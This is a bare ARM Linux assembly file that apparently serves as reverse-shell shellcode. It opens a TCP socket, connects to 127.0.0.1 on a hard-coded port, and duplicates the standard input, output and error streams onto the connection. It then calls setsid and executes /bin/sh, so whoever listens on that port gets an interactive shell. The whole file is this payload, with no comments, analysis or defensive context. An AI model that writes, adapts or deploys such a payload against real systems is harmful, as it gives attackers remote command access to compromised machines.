.syntax unified
.arch armv7-a
.text
.globl _start
.type _start, %function
_start:
mov  r0, #2
mov  r1, #1
mov  r2, #0
mov  r7, #281
svc  #0
mov  r4, r0
cmp  r4, #0
blt  stub
sub  sp, sp, #16
mov  r0, #2
strh r0, [sp]
movw r0, #0x5F76
strh r0, [sp, #2]
mov  r0, #0x01000000
orr  r0, r0, #0x7F
str  r0, [sp, #4]
mov  r0, #0
str  r0, [sp, #8]
mov  r0, r4
mov  r1, sp
mov  r2, #16
mov  r7, #283
svc  #0
add  sp, sp, #16
cmp  r0, #0
blt  stub
mov  r5, #0
dup_loop:
mov  r0, r4
mov  r1, r5
mov  r7, #63
svc  #0
add  r5, r5, #1
cmp  r5, #3
blt  dup_loop
mov  r7, #157
svc  #0
adr  r6, binsh
sub  sp, sp, #8
str  r6, [sp]
mov  r0, #0
str  r0, [sp, #4]
mov  r0, r6
mov  r1, sp
mov  r2, #0
mov  r7, #11
svc  #0
add  sp, sp, #8
stub:
.inst 0xEAFFFFFE
binsh:
.asciz "/bin/sh"
